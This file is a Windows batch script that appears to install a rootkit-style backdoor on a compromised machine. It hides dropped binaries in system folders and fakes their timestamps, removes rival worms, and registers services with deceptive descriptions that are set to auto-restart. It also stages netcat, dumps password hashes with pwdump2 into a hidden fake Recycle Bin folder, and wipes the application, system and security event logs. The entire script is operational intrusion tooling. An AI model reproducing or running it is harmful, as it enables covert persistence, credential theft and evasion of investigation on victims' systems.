REM start..
REM @echo off
	set DR=%windir%\system
	set DR32=%windir%\system32
	set START=%cd%
	
REM store date..
	date /T > date.tmp

REM set date back..
	date 04-11-03

REM moving files..
	unrar x -o+ io.rar %systemroot%\system32\wbem
	
	move SERVICES.EXE %dr%
	move CSRSS.EXE %dr%
	move mswindows~3.tmp %dr%
	move debug.tmp %dr%
	move debug.dll %dr%
	move scvhost.exe %dr%
	move NTSVC.ocx %dr%
	move sig.dll %dr%
	move chg.dll %dr%
	
	move pskill.exe %dr32%
	move tlist.exe %dr32%
	move nc.exe %dr32%
	move snget.exe %dr32%
	move ser.exe %dr32%
	move raddrv.dll %dr32%
	move admdll.dll %dr32%
	move srvany.exe %dr32%
	move inv.exe %dr32%


REM fix times, attribs..
	attrib +R +S +H %dr%\SERVICES.EXE
	attrib +R +S +H %dr%\CSRSS.EXE
	attrib    +S +H %dr%\mswindows~3.tmp
	attrib +R +S +H %dr%\debug.tmp
	attrib +R +S +H %dr%\debug.dll
	attrib +R +S +H %dr%\scvhost.exe
	attrib +R +S +H %dr%\NTSVC.ocx
	attrib +R +S +H %dr%\sig.dll
	attrib +R +S +H %dr%\chg.dll
	
	attrib +R +S +H %dr32%\pskill.exe
	attrib +R +S +H %dr32%\tlist.exe
	attrib +R +S +H %dr32%\nc.exe
	attrib +R +S +H %dr32%\snget.exe
	attrib +R +S +H %dr32%\ser.exe
	attrib +R +S +H %dr32%\raddrv.dll
	attrib +R +S +H %dr32%\srvany.exe
	attrib +R +S +H %dr32%\admdll.dll
	attrib +R +S +H %dr32%\inv.exe
	
	ct		%dr%\SERVICES.EXE
	ct		%dr%\CSRSS.EXE
	ct		%dr%\mswindows~3.tmp
	ct		%dr%\debug.tmp
	ct		%dr%\debug.dll
	ct		%dr%\NTSVC.ocx
	ct		%dr%\scvhost.exe
	ct		%dr%\sig.dll
	ct		%dr%\chg.dll
	
	ct		%dr32%\pskill.exe
	ct		%dr32%\tlist.exe
	ct		%dr32%\nc.exe
	ct		%dr32%\snget.exe
	ct		%dr32%\ser.exe
	ct		%dr32%\raddrv.dll
	ct		%dr32%\srvany.exe
	ct		%dr32%\admdll.dll
	ct		%dr32%\inv.exe

REM remove old services/files etc..
	net stop "Windows Management Toolkit"
	net stop "Windows Management Balance Kit"
	net stop IOsvc
	
	as /remove "Windows Management Toolkit"
	as /remove "Windows Management Balance Kit"
	NtlogonWrk.exe -u IOsvc
	
	ser delete "AppToService_Windows Management Toolkit"
	ser delete "AppToService_Windows Management Balance Kit"
	ser delete r_server
	
	del /F /Q /S %windir%\system32\config\wincp.{21EC2020-3AEA-1069-A2DD-08002B30309D}\*
	del /F /Q /S %windir%\system32\spool\winrecycle.{645FF040-5081-101B-9F08-00AA002F954E}\*
	del /F /Q /S %windir%\system32\io\*
	
	rd %windir%\system32\config\wincp.{21EC2020-3AEA-1069-A2DD-08002B30309D}
	rd %windir%\system32\spool\winrecycle.{645FF040-5081-101B-9F08-00AA002F954E}
	rd %windir%\system32\io
	
REM cleanup from other worms/shit..
	net stop AppToService_Windhost
	net stop AppToService_WindowsUpdate
	net stop AppToService_WinNT
	
	ser delete AppToService_Windhost
	ser delete AppToService_WindowsUpdate
	ser delete AppToService_WinNT

REM making registry changes..
	%windir%\regedit /S su.reg
	%windir%\regedit /S ra.reg
	
REM extracting IO...
	set IODIR=%systemroot%\system32\wbem
	md %IODIR%
	move io.rar %IODIR%
	move unrar.exe %IODIR%
	cd %IODIR%
	unrar x -o+ io.rar
	cd %START%
	
REM installing new services..
	%dr%\SERVICES.EXE /I
	ser createsvrany "NetDDEDaemon" "Network DDE Daemon" "%dr32%\srvany.exe" "%dr%\CSRSS.exe"
	ser createsvrany "lanmandaemon" "Logical Disk Manager Service" "%dr32%\srvany.exe" "%systemroot%\system32\wbem\system\SMSS.EXE"

	sc config LSServ error= ignore
	sc config NetDDEDaemon error= ignore
	sc config lanmandaemon error= ignore
	
	sc failure LSServ actions= restart/500 reset= 10
	sc failure NetDDEDaemon actions= restart/500 reset= 10
	sc failure lanmandaemon actions= restart/500 reset= 10
	
	sc config lanmanserver depend= LSServ/NetDDEDaemon/lanmandaemon
	sc config lanmanworkstation depend= LSServ/NetDDEDaemon/lanmandaemon
	
	sc description LSServ "The LSass Server provides SSH access to your computer for automatic updating purposes"
	sc description NetDDEDaemon "This services handles the network-DDE linkage between your ethernet interfaces"
	sc description lanmandaemon "The logical disk manager service provides low-level communication with your harddrives"
	
	net start LSServ
	net start NetDDEDaemon
	net start lanmandaemon

REM protecting services..
	%dr%\scvhost /install /1
	%dr%\scvhost /install /2
	%dr%\scvhost /add COM+
	%dr%\scvhost /add MSDOTNET
	%dr%\scvhost /add LSServ
	%dr%\scvhost /add NetDDEDaemon
	%dr%\scvhost /add lanmandaemon
	net start MSDOTNET

REM secure box..
	dcompatch.exe
	patch.exe


REM create file dirs..
	md "C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}"
	md "C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\.0"
	md "C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\.1"
	md "C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\.2"
	md "C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\.3"
	md "C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\.4"
	md "C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\.5"
	md "C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\.6"
	md "C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\.7"
	md "C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\.8"
	md "C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\.9"
	attrib "C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}" +H
	
REM restore old date..
	for /f "eol=; tokens=2*" %%i in (date.tmp) do date %%i
		
REM collect info..
	set nfo=C:\recycler\Recycle Bin.{645FF040-5081-101B-9F08-00AA002F954E}\info.txt
	ser list > "%NFO%"
	psinfo >> "%NFO%"
	fport >> "%NFO%"
	uptime /s >> "%NFO%"
	pwdump2.exe >> "%NFO%"
	
REM clear logs..
	cl -app
	cl -sys
	cl -sec
	
REM cleanup..	
	del %systemroot%\temp\temp.mdb
	del nt.tmp
	del su.reg
	del ra.reg
	del sc.reg
	del date.tmp
	del cl.exe
	del ct.exe
	del dcompatch.exe
	del patch.exe
	del uptime.exe
	del psinfo.exe
	del fport.exe
	del %iodir%\io.rar
	del %iodir%\unrar.exe
	del sc.exe
	del as.exe
	del pwdump2.exe
	del samdump.dll
	del ntlogonwrk.exe
	
	pskill winsys32.exe
	del %dr32%\winsys32.exe
	del C:\recycler\winsys32.exe
	
	set NFO=
	set DR=
	set DR32=
	set START=
	set IODIR=
	
	echo I like pie > install.cmd